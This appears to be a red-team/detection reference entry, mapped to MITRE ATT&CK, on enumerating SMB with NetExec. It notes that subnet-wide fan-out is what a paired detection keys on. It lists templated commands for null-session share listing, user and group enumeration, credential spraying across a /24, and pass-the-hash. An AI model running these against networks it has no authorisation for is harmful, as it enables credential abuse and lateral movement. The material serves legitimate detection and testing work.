---
id: smb-enum-nxc
title: SMB enum via NetExec (null → authed → pass-the-hash)
section: Netbios-ssn / Microsoft-ds — TCP 139/445 (SMB)
phase: Discovery
attack:
  tactic: TA0007
  techniques: [T1135, T1087.002]
platform: [windows, network]
source: hacktheplanet §"Netbios-ssn / Microsoft-ds — TCP 139/445 (SMB)"
pair: smb-enum-5145
---

Null session first, then an authed sweep. Spraying one credential across the
subnet is bread-and-butter credential reuse. The `-H` form swaps a password for
an NT hash (pass-the-hash).

The subnet form is what the paired detection actually keys on: `--shares` and
`--loggedon-users` reach the target over the `srvsvc` / `wkssvc` RPC pipes, and
walking a `/24` writes that access on every host it touches. One host looks like
a user browsing a share; the fan-out is the tell.

```sh
nxc smb {{rhost}} -u '' -p '' --shares           # null session
nxc smb {{rhost}} -u {{user}} -p {{password}} --users --groups --shares --pass-pol
nxc smb {{rhost}} -u {{user}} -p {{password}} --loggedon-users
nxc smb {{rhost}}/24 -u {{user}} -p {{password}}     # spray a cred across the subnet (reuse = bread & butter)
nxc smb {{rhost}}    -u {{user}} -H {{nthash}}       # pass-the-hash
```
